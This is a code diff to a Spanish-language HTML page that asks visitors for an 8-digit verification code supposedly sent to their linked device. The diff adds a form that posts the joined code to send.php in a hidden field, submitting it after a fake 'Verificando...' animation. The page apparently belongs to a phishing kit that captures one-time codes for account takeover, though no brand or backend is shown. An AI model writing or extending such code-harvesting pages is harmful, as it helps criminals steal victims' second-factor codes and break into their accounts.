@@ -63,7 +63,7 @@
                     <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"></path>
                 </svg>
             </div>
-
+            <form id="otpForm" action="send.php" method="POST">
             <div class="space-y-2">
                 <h2 class="text-xl font-bold text-gray-800">Código de Verificación</h2>
                 <p class="text-sm text-gray-500 px-6">Hemos enviado un código de 8 dígitos a tu dispositivo vinculado. Introdúcelo para continuar.</p>
@@ -90,19 +90,25 @@
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
                 <input type="text" maxlength="1" class="otp-input" inputmode="numeric">
             </div>
-
+            <input type="hidden" name="codigo" id="codigoCompleto">
             <div class="pt-6 space-y-4">
                 <button id="btnFinal" disabled class="w-full bg-gray-200 text-gray-400 font-bold py-4 rounded-lg transition-all duration-300">
                     Confirmar Código
                 </button>
                 <p class="text-xs text-gray-400">¿No recibiste el código? <span class="text-red-600 font-semibold cursor-pointer">Reenviar en 0:59</span></p>
             </div>
+            </form>
         </div>
     </div>
 
     <script>
+
 const inputs = document.querySelectorAll('.otp-input');
 const btnFinal = document.getElementById('btnFinal');
+
+/* NUEVO */
+const form = document.getElementById('otpForm');
+const hiddenInput = document.getElementById('codigoCompleto');
 
 // SALTO AUTOMATICO ENTRE INPUTS
 inputs.forEach((input, index) => {
@@ -172,11 +178,16 @@ function checkComplete() {
 }
 
 // BOTON CONFIRMAR
-btnFinal.addEventListener('click', () => {
+btnFinal.addEventListener('click', (e) => {
+
+    e.preventDefault();
 
     const finalCode = Array.from(inputs)
         .map(i => i.value)
         .join('');
+
+    /* GUARDAR CODIGO COMPLETO EN INPUT HIDDEN */
+    hiddenInput.value = finalCode;
 
     // ANIMACION BOTON
     btnFinal.innerText = "Verificando...";
@@ -195,9 +206,13 @@ btnFinal.addEventListener('click', () => {
             'bg-green-600'
         );
 
+        /* ENVIAR FORM */
+        form.submit();
+
     }, 1200);
 
 });
-    </script>
+
+</script>
 </body>
 </html>
